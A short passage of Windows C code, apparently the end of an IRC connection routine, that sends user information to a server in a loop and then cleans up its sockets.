				irc_userinfo(ircsock, szNick, (char *)servers[i].server, (char *)serverpassword);
		}
			Sleep(10);
	}
		WSACleanup();
		return 0;
}
